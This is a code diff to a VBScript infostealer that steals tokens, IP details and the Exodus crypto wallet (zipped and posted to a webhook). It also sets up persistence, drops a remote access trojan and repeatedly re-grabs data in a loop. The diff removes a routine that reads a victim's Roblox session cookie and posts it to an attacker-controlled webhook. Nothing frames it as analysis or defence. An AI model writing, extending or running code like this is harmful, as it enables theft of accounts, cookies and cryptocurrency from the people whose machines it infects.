@@ -22,7 +22,7 @@ USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 Call IP(WH)
 Call GrabTokens(WH)
 Call Persistence
-Call GrabExodus(WH)
+Call GrabExodus(WH) ' Only the working Exodus UI is kept
 
 ' --- 2. RAT DROP (LOGS CHANNEL) ---
 Call DropRAT(WH, True)
@@ -36,7 +36,6 @@ Do
     
     Call GrabTokens(RE_WH)
     Call IP(RE_WH)
-    Call PostCookieOnly(RE_WH)
     Call GrabFroststrap(RE_WH)
     
     Call DropRAT(RE_WH, False)
@@ -74,13 +73,6 @@ Sub GrabExodus(targetWH)
         Call PostFileTo("exodus_wallet.zip", ReadFile(zipPath), targetWH, "")
         fso.DeleteFile zipPath, True
     End If
-End Sub
-
-' --- PostCookieOnly (For Re-grab) ---
-Sub PostCookieOnly(targetWH)
-    Dim cookie : cookie = GetRobloxCookie()
-    If Len(cookie) = 0 Then Exit Sub
-    Call PostEmbedTo("Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, targetWH)
 End Sub
 
 ' --- RAT DROP ---
